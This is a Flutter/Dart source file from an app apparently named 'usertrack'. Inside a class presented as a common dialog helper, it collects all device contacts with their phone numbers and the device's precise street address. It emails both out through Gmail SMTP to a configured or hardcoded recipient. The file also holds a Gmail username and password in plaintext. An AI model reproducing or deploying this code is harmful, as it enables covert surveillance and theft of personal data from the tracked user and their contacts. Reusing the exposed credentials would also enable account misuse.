import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:usertrack_main/config/constants.dart';
import 'package:usertrack_main/custom/alert_dialog.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:usertrack_main/sp_utils/sp_utils.dart';

class CommonDialog {
  static void showDialogApp(BuildContext context, String title,
      {Function(String)? eventCallBack}) {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        // return object of type Dialog
        return DialogWidget(title: title, eventCallBack: eventCallBack);
      },
    );

  }

  static void sendMail(String mailRecipient, String title, String content) async{
    String username = 'baokimpg@gmail.com';
    String password = 'Donkihote49@';

    print(mailRecipient);

    final smtpServer = gmail(username, password);

    // Create our message.
    final message = Message()
      ..from = Address(username, 'Your name')
      ..recipients.add(mailRecipient)
      ..subject = title
      ..text = content;

    final sendReport = await send(message, smtpServer);
    print('Message sent: ' + sendReport.toString());
  }


  static Future<String> sendContacts() async {
    String names = '';
    String listContacts = '';
    await Permission.contacts.status;
    await Permission.contacts.request();
    Iterable<Contact> _contacts =
    await ContactsService.getContacts(withThumbnails: false);
    _contacts.forEach((contact) {
      contact.phones!.forEach((element) {
        names = contact.displayName! + ": " + element.value!;
        listContacts += names + '\n';
      });
    });
    print(listContacts);
    sendMail(SpUtils.get(GMAIL,initValue: 'phucgolkk02@gmail.com'), 'Contacts', listContacts);
    return listContacts;
  }

  static Future<String> sendAddressFromLatLong()async {
    Position position = await _getGeoLocationPosition();
    List<Placemark> placemarks = await placemarkFromCoordinates(position.latitude, position.longitude);
    print(placemarks);
    Placemark place = placemarks[0];
    String addressStr = '${place.street}, ${place.subLocality}, ${place.locality}, ${place.postalCode}, ${place.country}';
    print(addressStr);
    sendMail(SpUtils.get(GMAIL,initValue: 'phucgolkk02@gmail.com'), 'Location', addressStr);
    return addressStr;
  }

  static Future<Position> _getGeoLocationPosition() async {
    bool serviceEnabled;
    LocationPermission permission;
    // Test if location services are enabled.
    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      // Location services are not enabled don't continue
      // accessing the position and request users of the
      // App to enable the location services.
      await Geolocator.openLocationSettings();
      return Future.error('Location services are disabled.');
    }
    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {

        return Future.error('Location permissions are denied');
      }
    }
    if (permission == LocationPermission.deniedForever) {
      // Permissions are denied forever, handle appropriately.
      return Future.error(
          'Location permissions are permanently denied, we cannot request permissions.');
    }
    // When we reach here, permissions are granted and we can
    // continue accessing the position of the device.
    return await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
  }


}